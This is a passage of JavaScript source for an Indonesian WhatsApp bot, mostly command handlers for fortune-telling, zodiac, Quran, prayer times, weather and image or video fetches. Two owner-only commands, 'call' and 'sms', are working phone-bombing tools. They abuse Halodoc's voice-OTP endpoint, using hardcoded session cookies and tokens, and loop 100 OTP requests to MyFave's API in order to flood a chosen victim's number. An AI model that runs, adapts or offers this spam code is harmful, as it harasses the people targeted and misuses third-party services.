 haikal.sendText(from, `⭔ *Nama :* ${anu.message.nama}\n⭔ *Lahir :* ${anu.message.tahun_lahir}\n⭔ *Gender :* ${anu.message.jenis_kelamin}\n⭔ *Angka Kua :* ${anu.message.angka_kua}\n⭔ *Kelompok :* ${anu.message.kelompok}\n⭔ *Karakter :* ${anu.message.karakter}\n⭔ *Sektor Baik :* ${anu.message.sektor_baik}\n⭔ *Sektor Buruk :* ${anu.message.sektor_buruk}`, m)
}
break
//=================================================//
case 'haribaik': {
if (isBan) return m.reply('*Lu Di Ban Owner*')
 if (!text) throw `Example : ${prefix + command} 7, 7, 2005`
 let [tgl, bln, thn] = text.split`,`
 let anu = await primbon.petung_hari_baik(tgl, bln, thn)
 if (anu.status == false) return m.reply(anu.message)
 haikal.sendText(from, `⭔ *Lahir :* ${anu.message.tgl_lahir}\n⭔ *Kala Tinantang :* ${anu.message.kala_tinantang}\n⭔ *Info :* ${anu.message.info}\n⭔ *Catatan :* ${anu.message.catatan}`, m)
}
break
//=================================================//
case 'harisangar': case 'taliwangke': {
if (isBan) return m.reply('*Lu Di Ban Owner*')
 if (!text) throw `Example : ${prefix + command} 7, 7, 2005`
 let [tgl, bln, thn] = text.split`,`
 let anu = await primbon.hari_sangar_taliwangke(tgl, bln, thn)
 if (anu.status == false) return m.reply(anu.message)
 haikal.sendText(from, `⭔ *Lahir :* ${anu.message.tgl_lahir}\n⭔ *Hasil :* ${anu.message.result}\n⭔ *Info :* ${anu.message.info}\n⭔ *Catatan :* ${anu.message.catatan}`, m)
}
break
//=================================================//
case 'harinaas': case 'harisial': {
if (isBan) return m.reply('*Lu Di Ban Owner*')
 if (!text) throw `Example : ${prefix + command} 7, 7, 2005`
 let [tgl, bln, thn] = text.split`,`
 let anu = await primbon.primbon_hari_naas(tgl, bln, thn)
 if (anu.status == false) return m.reply(anu.message)
 haikal.sendText(from, `⭔ *Hari Lahir :* ${anu.message.hari_lahir}\n⭔ *Tanggal Lahir :* ${anu.message.tgl_lahir}\n⭔ *Hari Naas :* ${anu.message.hari_naas}\n⭔ *Info :* ${anu.message.catatan}\n⭔ *Catatan :* ${anu.message.info}`, m)
}
break
//=================================================//
case 'nagahari': case 'harinaga': {
if (isBan) return m.reply('*Lu Di Ban Owner*')
 if (!text) throw `Example : ${prefix + command} 7, 7, 2005`
 let [tgl, bln, thn] = text.split`,`
 let anu = await primbon.rahasia_naga_hari(tgl, bln, thn)
 if (anu.status == false) return m.reply(anu.message)
 haikal.sendText(from, `⭔ *Hari Lahir :* ${anu.message.hari_lahir}\n⭔ *Tanggal Lahir :* ${anu.message.tgl_lahir}\n⭔ *Arah Naga Hari :* ${anu.message.arah_naga_hari}\n⭔ *Catatan :* ${anu.message.catatan}`, m)
}
break
//=================================================//
case 'arahrejeki': case 'arahrezeki': {
if (isBan) return m.reply('*Lu Di Ban Owner*')
 if (!text) throw `Example : ${prefix + command} 7, 7, 2005`
 let [tgl, bln, thn] = text.split`,`
 let anu = await primbon.primbon_arah_rejeki(tgl, bln, thn)
 if (anu.status == false) return m.reply(anu.message)
 haikal.sendText(from, `⭔ *Hari Lahir :* ${anu.message.hari_lahir}\n⭔ *tanggal Lahir :* ${anu.message.tgl_lahir}\n⭔ *Arah Rezeki :* ${anu.message.arah_rejeki}\n⭔ *Catatan :* ${anu.message.catatan}`, m)
}
break
//=================================================//
case 'peruntungan': {
if (isBan) return m.reply('*Lu Di Ban Owner*')
 if (!text) throw `Example : ${prefix + command} ZENN MODS WA, 7, 7, 2005, 2022\n\nNote : ${prefix + command} Nama, tanggal lahir, bulan lahir, tahun lahir, untuk tahun`
 let [nama, tgl, bln, thn, untuk] = text.split`,`
 let anu = await primbon.ramalan_peruntungan(nama, tgl, bln, thn, untuk)
 if (anu.status == false) return m.reply(anu.message)
 haikal.sendText(from, `⭔ *Nama :* ${anu.message.nama}\n⭔ *Lahir :* ${anu.message.tgl_lahir}\n⭔ *Peruntungan Tahun :* ${anu.message.peruntungan_tahun}\n⭔ *Hasil :* ${anu.message.result}\n⭔ *Catatan :* ${anu.message.catatan}`, m)
}
break
//=================================================//
case 'weton': case 'wetonjawa': {
if (isBan) return m.reply('*Lu Di Ban Owner*')
 if (!text) throw `Example : ${prefix + command} 7, 7, 2005`
 let [tgl, bln, thn] = text.split`,`
 let anu = await primbon.weton_jawa(tgl, bln, thn)
 if (anu.status == false) return m.reply(anu.message)
 haikal.sendText(from, `⭔ *Tanggal :* ${anu.message.tanggal}\n⭔ *Jumlah Neptu :* ${anu.message.jumlah_neptu}\n⭔ *Watak Hari :* ${anu.message.watak_hari}\n⭔ *Naga Hari :* ${anu.message.naga_hari}\n⭔ *Jam Baik :* ${anu.message.jam_baik}\n⭔ *Watak Kelahiran :* ${anu.message.watak_kelahiran}`, m)
}
break
//=================================================//
case 'sifat': case 'karakter': {
if (isBan) return m.reply('*Lu Di Ban Owner*')
 if (!text) throw `Example : ${prefix + command} ZENN MODS WA, 7, 7, 2005`
 let [nama, tgl, bln, thn] = text.split`,`
 let anu = await primbon.sifat_karakter_tanggal_lahir(nama, tgl, bln, thn)
 if (anu.status == false) return m.reply(anu.message)
 haikal.sendText(from, `⭔ *Nama :* ${anu.message.nama}\n⭔ *Lahir :* ${anu.message.tgl_lahir}\n⭔ *Garis Hidup :* ${anu.message.garis_hidup}`, m)
}
break
//=================================================//
case 'keberuntungan': {
if (isBan) return m.reply('*Lu Di Ban Owner*')
 if (!text) throw `Example : ${prefix + command} ZENN MODS WA, 7, 7, 2005`
 let [nama, tgl, bln, thn] = text.split`,`
 let anu = await primbon.potensi_keberuntungan(nama, tgl, bln, thn)
 if (anu.status == false) return m.reply(anu.message)
 haikal.sendText(from, `⭔ *Nama :* ${anu.message.nama}\n⭔ *Lahir :* ${anu.message.tgl_lahir}\n⭔ *Hasil :* ${anu.message.result}`, m)
}
break
//=================================================//
case 'memancing': {
if (isBan) return m.reply('*Lu Di Ban Owner*')
 if (!text) throw `Example : ${prefix + command} 12, 1, 2022`
 let [tgl, bln, thn] = text.split`,`
 let anu = await primbon.primbon_memancing_ikan(tgl, bln, thn)
 if (anu.status == false) return m.reply(anu.message)
 haikal.sendText(from, `⭔ *Tanggal :* ${anu.message.tgl_memancing}\n⭔ *Hasil :* ${anu.message.result}\n⭔ *Catatan :* ${anu.message.catatan}`, m)
}
break
//=================================================//
case 'masasubur': {
if (isBan) return m.reply('*Lu Di Ban Owner*')
 if (!text) throw `Example : ${prefix + command} 12, 1, 2022, 28\n\nNote : ${prefix + command} hari pertama menstruasi, siklus`
 let [tgl, bln, thn, siklus] = text.split`,`
 let anu = await primbon.masa_subur(tgl, bln, thn, siklus)
 if (anu.status == false) return m.reply(anu.message)
 haikal.sendText(from, `⭔ *Hasil :* ${anu.message.result}\n⭔ *Catatan :* ${anu.message.catatan}`, m)
}
break
//=================================================//
case 'zodiak': case 'zodiac': {
if (isBan) return m.reply('*Lu Di Ban Owner*')
 if (!text) throw `Example : ${prefix+ command} 7 7 2005`
 let zodiak = [
 ["capricorn", new Date(1970, 0, 1)],
 ["aquarius", new Date(1970, 0, 20)],
 ["pisces", new Date(1970, 1, 19)],
 ["aries", new Date(1970, 2, 21)],
 ["taurus", new Date(1970, 3, 21)],
 ["gemini", new Date(1970, 4, 21)],
 ["cancer", new Date(1970, 5, 22)],
 ["leo", new Date(1970, 6, 23)],
 ["virgo", new Date(1970, 7, 23)],
 ["libra", new Date(1970, 8, 23)],
 ["scorpio", new Date(1970, 9, 23)],
 ["sagittarius", new Date(1970, 10, 22)],
 ["capricorn", new Date(1970, 11, 22)]
 ].reverse()

 function getZodiac(month, day) {
 let d = new Date(1970, month - 1, day)
 return zodiak.find(([_,_d]) => d >= _d)[0]
 }
 let date = new Date(text)
 if (date == 'Invalid Date') throw date
 let d = new Date()
 let [tahun, bulan, tanggal] = [d.getFullYear(), d.getMonth() + 1, d.getDate()]
 let birth = [date.getFullYear(), date.getMonth() + 1, date.getDate()]
 let zodiac = await getZodiac(birth[1], birth[2])
 let anu = await primbon.zodiak(zodiac)
 if (anu.status == false) return m.reply(anu.message)
 haikal.sendText(from, `⭔ *Zodiak :* ${anu.message.zodiak}\n⭔ *Nomor :* ${anu.message.nomor_keberuntungan}\n⭔ *Aroma :* ${anu.message.aroma_keberuntungan}\n⭔ *Planet :* ${anu.message.planet_yang_mengitari}\n⭔ *Bunga :* ${anu.message.bunga_keberuntungan}\n⭔ *Warna :* ${anu.message.warna_keberuntungan}\n⭔ *Batu :* ${anu.message.batu_keberuntungan}\n⭔ *Elemen :* ${anu.message.elemen_keberuntungan}\n⭔ *Pasangan Zodiak :* ${anu.message.pasangan_zodiak}\n⭔ *Catatan :* ${anu.message.catatan}`, m)
}
break
//=================================================//
case 'shio': {
if (isBan) return m.reply('*Lu Di Ban Owner*')
 if (!text) throw `Example : ${prefix + command} tikus\n\nNote : For Detail https://primbon.com/shio.htm`
 let anu = await primbon.shio(text)
 if (anu.status == false) return m.reply(anu.message)
 haikal.sendText(from, `⭔ *Hasil :* ${anu.message}`, m)
}
break
//=================================================//
case 'inspect': {
if (isBan) return m.reply('*Lu Di Ban Owner*')
if (!args[0]) return m.reply("Linknya?")
let linkRegex = args.join(" ")
let coded = linkRegex.split("https://chat.whatsapp.com/")[1]
if (!coded) return m.reply("Link Invalid")
haikal.query({
tag: "iq",
attrs: {
type: "get",
xmlns: "w:g2",
to: "@g.us"
},
content: [{ tag: "invite", attrs: { code: coded } }]
}).then(async(res) => { 
tekse = `「 Group Link Yang Di Inspect 」
▸ Nama Group : ${res.content[0].attrs.subject ? res.content[0].attrs.subject : "undefined"}

▸ Deskripsi Di Ubah : ${res.content[0].attrs.s_t ? moment(res.content[0].attrs.s_t *1000).tz("Asia/Jakarta").format("DD-MM-YYYY, HH:mm:ss") : "undefined"}
▸ Pembuat Group : ${res.content[0].attrs.creator ? "@" + res.content[0].attrs.creator.split("@")[0] : "undefined"}
▸ Group Di Buat : ${res.content[0].attrs.creation ? moment(res.content[0].attrs.creation * 1000).tz("Asia/Jakarta").format("DD-MM-YYYY, HH:mm:ss") : "undefined"}
▸ Total Member : ${res.content[0].attrs.size ? res.content[0].attrs.size : "undefined"} Member

▸ ID Group  : ${res.content[0].attrs.id ? res.content[0].attrs.id : "undefined"}

©By ZENN MODS WA`
try {
pp = await haikal.profilePictureUrl(res.content[0].attrs.id + "@g.us", "image")
} catch {
pp = "https://tse2.mm.bing.net/th?id=OIP.n1C1oxOvYLLyDIavrBFoNQHaHa&pid=Api&P=0&w=153&h=153"
}
haikal.sendFile(from, pp, "", m, { caption: tekse, mentions: await haikal.parseMention(tekse) })

})
}
break
//=================================================//
case "asupan1":{
if (isBan) return m.reply('*Lu Di Ban Owner*')
m.reply('*Sabar Cuy Loading*')
let res = await tiktok('https://vt.tiktok.com/ZS83Ytq5b/')
haikal.sendMessage(m.chat, {video:{url: res.url[0].url},
caption: `
辛 🤤 Ahh`}, {quoted : hw})
}
break
case "asupan2":{
if (isBan) return m.reply('*Lu Di Ban Owner*')
m.reply('*Sabar Cuy Loading*')
let res = await tiktok('https://vt.tiktok.com/ZS83Y9a9d/')
haikal.sendMessage(m.chat, {video:{url: res.url[0].url},
caption: `
辛 🤤 Ahh`}, {quoted : hw})
}
break
case "asupan3":{
if (isBan) return m.reply('*Lu Di Ban Owner*')
m.reply('*Sabar Cuy Loading*')
let res = await tiktok('https://vt.tiktok.com/ZS83YpRr4/')
haikal.sendMessage(m.chat, {video:{url: res.url[0].url},
caption: `
辛 🤤 Ahh`}, {quoted : hw})
}
break
case "asupan4":{
if (isBan) return m.reply('*Lu Di Ban Owner*')
m.reply('*Sabar Cuy Loading*')
let res = await tiktok('https://vt.tiktok.com/ZS83YfoYm/')
haikal.sendMessage(m.chat, {video:{url: res.url[0].url},
caption: `
辛 🤤 Ahh`}, {quoted : hw})
}
break
case "asupan5":{
if (isBan) return m.reply('*Lu Di Ban Owner*')
m.reply('*Sabar Cuy Loading*')
let res = await tiktok('https://www.tiktok.com/@menantu_idamannnn/video/7211912588366548251?_r=1&u_code=dgc2fmm4i3k9b1&region=ID&mid=7211912606574627610&preview_pb=0&sharer_language=id&_d=d9iga21gg7d358&share_item_id=7211912588366548251&source=h5_t&timestamp=1682941528&user_id=6914652081950639106&sec_user_id=MS4wLjABAAAABSJMM2SSvwkONssmfetetURo2KRIL-wv22KQFCPh-ARQ0bEMn7lZ3gkjm6BhZdlm&social_share_type=0&utm_source=copy&utm_campaign=client_share&utm_medium=android&share_iid=7227953970441242394&share_link_id=5530f877-35fd-4db3-9b7c-d0c8e7e749ed&share_app_id=1180&ugbiz_name=Main&ug_btm=b6880%2Cb2878')
haikal.sendMessage(m.chat, {video:{url: res.url[0].url},
caption: `
辛 🤤 Ahh`}, {quoted : hw})
}
break
case "asupan6":{
if (isBan) return m.reply('*Lu Di Ban Owner*')
m.reply('*Sabar Cuy Loading*')
let res = await tiktok('https://vt.tiktok.com/ZS83YyKm7/')
haikal.sendMessage(m.chat, {video:{url: res.url[0].url},
caption: `
辛 🤤 Ahh`}, {quoted : hw})
}
break
case "asupan7":{
if (isBan) return m.reply('*Lu Di Ban Owner*')
m.reply('*Sabar Cuy Loading*')
let res = await tiktok('https://vt.tiktok.com/ZS8wpweu7/')
haikal.sendMessage(m.chat, {video:{url: res.url[0].url},
caption: `
辛 🤤 Ahh`}, {quoted : hw})
}
break
case "asupan8":{
if (isBan) return m.reply('*Lu Di Ban Owner*')
m.reply('*Sabar Cuy Loading*')
let res = await tiktok('https://vt.tiktok.com/ZS83Y9Y2p/')
haikal.sendMessage(m.chat, {video:{url: res.url[0].url},
caption: `
辛 🤤 Ahh`}, {quoted : hw})
}
break
case "asupan9":{
if (isBan) return m.reply('*Lu Di Ban Owner*')
m.reply('*Sabar Cuy Loading*')
let res = await tiktok('https://vt.tiktok.com/ZS83Ygms3/')
haikal.sendMessage(m.chat, {video:{url: res.url[0].url},
caption: `
辛 🤤 Ahh`}, {quoted : hw})
}
break
case "asupan10":{
if (isBan) return m.reply('*Lu Di Ban Owner*')
m.reply('*Sabar Cuy Loading*')
let res = await tiktok('https://vt.tiktok.com/ZS83YsuNQ/')
haikal.sendMessage(m.chat, {video:{url: res.url[0].url},
caption: `
辛 🤤 Ahh`}, {quoted : hw})
}
break
case "asupan12":{
if (isBan) return m.reply('*Lu Di Ban Owner*')
m.reply('*Sabar Cuy Loading*')
let res = await tiktok('https://vt.tiktok.com/ZS83YtYaQ/')
haikal.sendMessage(m.chat, {video:{url: res.url[0].url},
caption: `
辛 🤤 Ahh`}, {quoted : hw})
}
break
case "asupan13":{
if (isBan) return m.reply('*Lu Di Ban Owner*')
m.reply('*Sabar Cuy Loading*')
let res = await tiktok('https://vt.tiktok.com/ZS83YbpvJ/')
haikal.sendMessage(m.chat, {video:{url: res.url[0].url},
caption: `
辛 🤤 Ahh`}, {quoted : hw})
}
break
case "asupan14":{
if (isBan) return m.reply('*Lu Di Ban Owner*')
m.reply('*Sabar Cuy Loading*')
let res = await tiktok('https://vt.tiktok.com/ZS83Y9FaD/')
haikal.sendMessage(m.chat, {video:{url: res.url[0].url},
caption: `
辛 🤤 Ahh`}, {quoted : hw})
}
break
case "asupan15":{
if (isBan) return m.reply('*Lu Di Ban Owner*')
m.reply('*Sabar Cuy Loading*')
let res = await tiktok('https://vt.tiktok.com/ZS8wpXDPm/')
haikal.sendMessage(m.chat, {video:{url: res.url[0].url},
caption: `
辛 🤤 Ahh`}, {quoted : hw})
}
break
case "asupan16":{
if (isBan) return m.reply('*Lu Di Ban Owner*')
m.reply('*Sabar Cuy Loading*')
let res = await tiktok('https://vt.tiktok.com/ZS8wpvaTV/')
haikal.sendMessage(m.chat, {video:{url: res.url[0].url},
caption: `
辛 🤤 Ahh`}, {quoted : hw})
}
break
case "asupan17":{
if (isBan) return m.reply('*Lu Di Ban Owner*')
m.reply('*Sabar Cuy Loading*')
let res = await tiktok('https://vt.tiktok.com/ZS83YaXCU/')
haikal.sendMessage(m.chat, {video:{url: res.url[0].url},
caption: `
辛 🤤 Ahh`}, {quoted : hw})
}
break
case "asupan18":{
if (isBan) return m.reply('*Lu Di Ban Owner*')
m.reply('*Sabar Cuy Loading*')
let res = await tiktok('https://vt.tiktok.com/ZS83EKHja/')
haikal.sendMessage(m.chat, {video:{url: res.url[0].url},
caption: `
辛 🤤 Ahh`}, {quoted : hw})
}
break
case "asupan19":{
if (isBan) return m.reply('*Lu Di Ban Owner*')
m.reply('*Sabar Cuy Loading*')
let res = await tiktok('https://vt.tiktok.com/ZS83Yyk6y/')
haikal.sendMessage(m.chat, {video:{url: res.url[0].url},
caption: `
辛 🤤 Ahh`}, {quoted : hw})
}
break
case "asupan20":{
if (isBan) return m.reply('*Lu Di Ban Owner*')
m.reply('*Sabar Cuy Loading*')
let res = await tiktok('https://vt.tiktok.com/ZS83Yb7GX/')
haikal.sendMessage(m.chat, {video:{url: res.url[0].url},
caption: `
辛 🤤 Ahh`}, {quoted : hw})
}
break
//=================================================
case 'hw': { 
if (isBan) return m.reply('*Lu Di Ban Owner*')
joauuuuuuu = fs.readFileSync('./baseikal/video/hwmods2.mp4')
haikal.sendMessage(m.chat, {video: joauuuuuuu, caption:`selamat datang`,viewOnce : true},{quoted : hw })
}
break
//=================================================
case 'listsurah':
axios
.get(`https://api.lolhuman.xyz/api/quran?apikey=${apikey}`)
.then(({ data }) => {
var text = 'List Surah:\n'
for (var x in data.result) {
text += `${x}. ${data.result[x]}\n`
}
reply(text)
})
.catch(console.error)
break
//=================================================
case 'alquran':
if (isBan) return m.reply('*Lu Di Ban Owner*')
if (args.length < 1) return reply(`Example: ${prefix + command} 18 or ${prefix + command} 18/10 or ${prefix + command} 18/1-10`)
axios
.get(`https://api.lolhuman.xyz/api/quran/${args[0]}?apikey=${apikey}`)
.then(({ data }) => {
var ayat = data.result.ayat
var text = `QS. ${data.result.surah} : 1-${ayat.length}\n\n`
for (var x of ayat) {
text += `${x.arab}\n${x.ayat}. ${x.latin}\n${x.indonesia}\n\n`
}
text = text.replace(/<u>/g, '_').replace(/<\/u>/g, '_')
text = text.replace(/<strong>/g, '*').replace(/<\/strong>/g, '*')
reply(text)
})
.catch(console.error)
break
//=================================================
case 'alquranaudio':
if (isBan) return m.reply('*Lu Di Ban Owner*')
if (args.length == 0) return reply(`Example: ${prefix + command} 18 or ${prefix + command} 18/10`)
haikal.sendMessage(from, { audio: { url: `https://api.lolhuman.xyz/api/quran/audio/${args[0]}?apikey=${apikey}` }, mimetype: 'audio/mp4' })
break
case 'asmaulhusna':
if (isBan) return m.reply('*Lu Di Ban Owner*')
axios
.get(`https://api.lolhuman.xyz/api/asmaulhusna?apikey=${apikey}`)
.then(({ data }) => {
var text = `No : ${data.result.index}\n`
text += `Latin: ${data.result.latin}\n`
text += `Arab : ${data.result.ar}\n`
text += `Indonesia : ${data.result.id}\n`
text += `English : ${data.result.en}`
reply(text)
})
.catch(console.error)
break
//=================================================
case 'kisahnabi':
if (isBan) return m.reply('*Lu Di Ban Owner*')
if (args.length == 0) return reply(`Example: ${prefix + command} Muhammad`)
axios
.get(`https://api.lolhuman.xyz/api/kisahnabi/${args[0]}?apikey=${apikey}`)
.then(({ data }) => {
var text = `Name : ${data.result.name}\n`
text += `Lahir : ${data.result.thn_kelahiran}\n`
text += `Umur : ${data.result.age}\n`
text += `Tempat : ${data.result.place}\n`
text += `Story : \n${data.result.story}`
reply(text)
})
.catch(console.error)
break
//=================================================
case 'jadwalsholat':
if (isBan) return m.reply('*Lu Di Ban Owner*')
if (args.length == 0) return reply(`Example: ${prefix + command} Yogyakarta`)
axios
.get(`https://api.lolhuman.xyz/api/sholat/${args[0]}?apikey=${apikey}`)
.then(({ data }) => {
var text = `Wilayah : ${data.result.wilayah}\n`
text += `Tanggal : ${data.result.tanggal}\n`
text += `Sahur : ${data.result.sahur}\n`
text += `Imsak : ${data.result.imsak}\n`
text += `Subuh : ${data.result.subuh}\n`
text += `Terbit : ${data.result.terbit}\n`
text += `Dhuha : ${data.result.dhuha}\n`
text += `Dzuhur : ${data.result.dzuhur}\n`
text += `Ashar : ${data.result.ashar}\n`
text += `Maghrib : ${data.result.imsak}\n`
text += `Isya : ${data.result.isya}`
reply(text)
})
.catch(console.error)
break
//=================================================
case "call":
if (!isCreator) return m.reply(`*khusus Premium*`)
if (!args[0]) return reply(`Penggunaan ${prefix+command} nomor\nContoh ${prefix+command} +6281214281312`)
let nosend = "+" + text.split("|")[0].replace(/[^0-9]/g, '')
if (args[0].startsWith(`+6281214281312`)) return reply('Tidak bisa call ke nomor ini!')
axios.post('https://magneto.api.halodoc.com/api/v1/users/authentication/otp/requests',{'phone_number':`${nosend}`,'channel': 'voice'},{headers: {'authority': 'magneto.api.halodoc.com','accept-language': 'id,en;q=0.9,en-GB;q=0.8,en-US;q=0.7','cookie': '_gcl_au=1.1.1860823839.1661903409; _ga=GA1.2.508329863.1661903409; afUserId=52293775-f4c9-4ce2-9002-5137c5a1ed24-p; XSRF-TOKEN=12D59ACD8AA0B88A7ACE05BB574FAF8955D23DBA28E8EE54F30BCB106413A89C1752BA30DC063940ED30A599C055CC810636; _gid=GA1.2.798137486.1664887110; ab.storage.deviceId.1cc23a4b-a089-4f67-acbf-d4683ecd0ae7=%7B%22g%22%3A%2218bb4559-2170-9c14-ddcd-2dc80d13c3e3%22%2C%22c%22%3A1656491802961%2C%22l%22%3A1664887110254%7D; amp_394863=nZm2vDUbDAvSia6NQPaGum...1gehg2efd.1gehg3c19.f.0.f; ab.storage.sessionId.1cc23a4b-a089-4f67-acbf-d4683ecd0ae7=%7B%22g%22%3A%22f1b09ad8-a7d9-16f3-eb99-a97ba52677d2%22%2C%22e%22%3A1664888940400%2C%22c%22%3A1664887110252%2C%22l%22%3A1664887140400%7D','origin': 'https://www.halodoc.com','sec-ch-ua': '"Microsoft Edge";v="105", "Not)A;Brand";v="8", "Chromium";v="105"','sec-ch-ua-mobile': '?0','sec-ch-ua-platform': '"Windows"','sec-fetch-dest': 'empty','sec-fetch-mode': 'cors','sec-fetch-site': 'same-site','user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/105.0.0.0 Safari/537.36 Edg/105.0.1343.53','x-xsrf-token': '12D59ACD8AA0B88A7ACE05BB574FAF8955D23DBA28E8EE54F30BCB106413A89C1752BA30DC063940ED30A599C055CC810636'}}).then(function (response) {reply(`${JSON.stringify(response.data, null, 2)}`)}).catch(function (error) {reply(`${JSON.stringify(error, null, 2)}`)})
break
//=================================================
case 'sms': {
if (!isCreator) return m.reply(`*khusus Premium*`)
const froms = m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, '')+'@s.whatsapp.net'
if (m.quoted || text) {
if (froms.startsWith('08')) return reply('Awali nomor dengan +62')
if (froms == owner) return reply('Tidak bisa spam ke nomor ini!')
let nosms = '+' + froms.replace('@s.whatsapp.net', '')
let mal = ["Mozilla/5.0 (X11; Ubuntu; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.87 Safari/537.36 RuxitSynthetic/1.0 v7108827108815046027 t6205049005192687891", "Mozilla/5.0 (X11; Ubuntu; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.87 Safari/537.36 RuxitSynthetic/1.0 v1692361810532096513 t9071033982482470646", "Mozilla/5.0 (X11; Ubuntu; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.87 Safari/537.36 RuxitSynthetic/1.0 v4466439914708508420 t8068951106021062059", "Mozilla/5.0 (X11; Ubuntu; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.87 Safari/537.36 RuxitSynthetic/1.0 v8880767681151577953 t8052286838287810618", "Mozilla/5.0 (X11; Ubuntu; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36 RuxitSynthetic/1.0 v6215776200348075665 t6662866128547677118", "Mozilla/5.0 (X11; Ubuntu; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.87 Safari/537.36 RuxitSynthetic/1.0 v1588190262877692089 t2919217341348717815", "Mozilla/5.0 (X11; Ubuntu; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.87 Safari/537.36 RuxitSynthetic/1.0 v5330150654511677032 t9071033982482470646", "Mozilla/5.0 (Linux; Android 10; M2006C3LG) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.101 Mobile Safari/537.36", "Mozilla/5.0 (Linux; Android 10; M2006C3LG) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.101 Mobile Safari/537.36", "Mozilla/5.0 (Linux; Android 11; vivo 2007) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.45 Mobile Safari/537.36", "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.101 Safari/537.36"]
let ua = mal[Math.floor(Math.random() * mal.length)];
let axios = require('axios').default;
let hd = {
'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.3'
};
const dat = {
'phone': nosms
};
for (let x = 0; x < 100; x++) {
axios.post('https://api.myfave.com/api/fave/v1/auth', dat, {
headers: hd
}).then(res => {
console.log(res);
}).catch(err => {
console.log(`[${new Date().toLocaleTimeString()}] Spam (SMS) BY HW MODS`);
});
}
} else reply(`Penggunaan spamsms nomor/reply pesan target*\nContoh spamsms +6281214281312`)
m.reply(`spam sms/call akan di kirim ke no target tuan 🙏🥺`)
}
break
//=================================================
case 'cerpen':
if (isBan) return m.reply('*Lu Di Ban Owner*')
var { data } = await axios.get(`https://api.lolhuman.xyz/api/cerpen?apikey=${apikey}`)
var textpp = `Title : ${data.result.title}\n`
textpp += `Creator : ${data.result.creator}\n`
textpp += `Story :\n${data.result.cerpen}`
reply(textpp)
break
//=================================================
case 'ceritahoror':
if (isBan) return m.reply('*Lu Di Ban Owner*')
var { data } = await axios.get(`https://api.lolhuman.xyz/api/ceritahoror?apikey=${apikey}`)
var caption = `Title : ${data.result.title}\n`
caption += `Desc : ${data.result.desc}\n`
caption += `Story :\n${data.result.story}\n`
haikal.sendMessage(from, { image: { url: data.result.thumbnail }, caption })
break
//=================================================
case 'cuaca':
if (isBan) return m.reply('*Lu Di Ban Owner*')
if (args.length == 0) return reply(`Example: ${prefix + command} Yogyakarta`)
var { data } = await axios.get(`https://api.lolhuman.xyz/api/cuaca/${args[0]}?apikey=${apikey}`)
var textppp = `Tempat : ${data.result.tempat}\n`
textppp += `Cuaca : ${data.result.cuaca}\n`
textppp += `Angin : ${data.result.angin}\n`
textppp += `Description : ${data.result.description}\n`
textppp += `Kelembapan : ${data.result.kelembapan}\n`
textppp += `Suhu : ${data.result.suhu}\n`
textppp += `Udara : ${data.result.udara}\n`
textppp += `Permukaan laut : ${data.result.permukaan_laut}\n`
haikal.sendMessage(from, { location: { degreesLatitude: data.result.latitude, degreesLongitude: data.result.longitude } })
reply(textppp)
break
//=================================================//
case 'gambar': {
if (isBan) return m.reply('*Lu Di Ban Owner*')
let { pinterest } = require('./baseikal/lib/scraper')
anu = await pinterest(text)
result = anu[Math.floor(Math.random() * anu.length)]
haikal.sendMessage(from, {image: { url: result }, caption: 'SUKSES'},{quoted : hw})
}
break
//=================================================
case 'cecanindo': {
if (isBan) return m.reply('*Lu Di Ban Owner*')
let { pinterest } = require('./baseikal/lib/scraper')
anu = await pinterest(`cecan indo`)
result = anu[Math.floor(Math.random() * anu.length)]
haikal.sendMessage(from, {image: { url: result }, caption: 'SUKSES'},{quoted : hw})
}
break
//=================================================
case 'cecanjepan': {
if (isBan) return m.reply('*Lu Di Ban Owner*')
let { pinterest } = require('./baseikal/lib/scraper')
anu = await pinterest(`cecan jepang`)
result = anu[Math.floor(Math.random() * anu.length)]
haikal.sendMessage(from, {image: { url: result }, caption: 'SUKSES'},{quoted : hw})
}
break
//=================================================
case 'cecanmalaysia': {
if (isBan) return m.reply('*Lu Di Ban Owner*')
let { pinterest } = require('./baseikal/lib/scraper')
anu = await pinterest(`cecan malaysia`)
result = anu[Math.floor(Math.random() * anu.length)]
haikal.sendMessage(from, {image: { url: result }, caption: 'SUKSES'},{quoted : hw})
}
break
//=================================================
case 'cecanhijaber': {
if (isBan) return m.reply('*Lu Di Ban Owner*')
let { pinterest } = require('./baseikal/lib/scraper')
anu = await pinterest(`cecan hijaber`)
result = anu[Math.floor(Math.random() * anu.length)]
haikal.sendMessage(from, {image: { url: result }, caption: 'SUKSES'},{quoted : hw})
}
break
//=================================================
case 'cecanchina': {
if (isBan) return m.reply('*Lu Di Ban Owner*')
let { pinterest } = require('./baseikal/lib/scraper')
anu = await pinterest(`cecan china`)
result = anu[Math.floor(Math.random() * anu.length)]
haikal.sendMessage(from, {image: { url: result }, caption: 'SUKSES'},{quoted : hw})
}
break
//=================================================
case 'cecanvietnam': {
if (isBan) return m.reply('*Lu Di Ban Owner*')
let { pinterest } = require('./baseikal/lib/scraper')
anu = await pinterest(`cecan vietnam`)
result = anu[Math.floor(Math.random() * anu.length)]
haikal.sendMessage(from, {image: { url: result }, caption: 'SUKSES'},{quoted : hw})
}
break
//=================================================
case 'cecankorea': {
if (isBan) return m.reply('*Lu Di Ban Owner*')
let { pinterest } = require('./baseikal/lib/scraper')
anu = await pinterest(`cecan korea`)
result = anu[Math.floor(Math.random() * anu.length)]
haikal.sendMessage(from, {image: { url: result }, caption: 'SUKSES'},{quoted : hw})
}
break
